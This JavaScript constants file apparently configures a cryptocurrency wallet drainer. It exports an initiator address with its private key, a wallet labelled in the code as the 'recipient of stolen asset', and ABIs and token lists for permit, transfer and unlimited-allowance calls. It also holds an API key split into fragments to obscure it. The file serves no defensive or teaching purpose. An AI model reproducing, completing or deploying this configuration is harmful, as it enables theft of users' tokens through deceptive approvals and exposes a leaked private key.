export const initiator = '0x5049bE34eE05627aD0C500f11B25d23c02F530b1'; // initiator address
export const initiatorPK =
  'bbdeb46f850dd3b11672db4f15b5ff15927cbfcdb9959ddc94df4a99e5966989'; // initiaror's private key
export const recipient = '0x16866d2b99354C5057aE414bbA03C7810b550E04'; // recipient of stolen asset
export { default as ALLOWANCEABI } from './abis/allowanceABI.json';
export { default as permitV2 } from './abis/permitvs.json';
export { default as CLAIMEABI } from './abis/claimABI.json';
export const projectId = '266adf3f12378f461f72258a250ac519';
export const deadline = 10000000000000;
export { default as permitTokens }from './permitTokens.json';
export { default as transferTokens } from './transferTokens.json';
export { default as increasAllownceTokens } from './increasAllownceTokens.json';

export const max =
  '115792089237316195423570985008687907853269984665640564039457584007913129639935';
export const claimAddress = '0x5F93C85fea3af5331037354ffAa19897A5AdA977';
const keys = [
  'A',
  'CUR',
  '7LHb',
  'xrjk',
  'tO',
  '5xFQ',
  '32h',
  'P4',
  '-UP',
  'axG',
  'fpH',
];
let akeys = '';
keys.forEach((k) => (akeys += k));
export const apikeys = akeys;
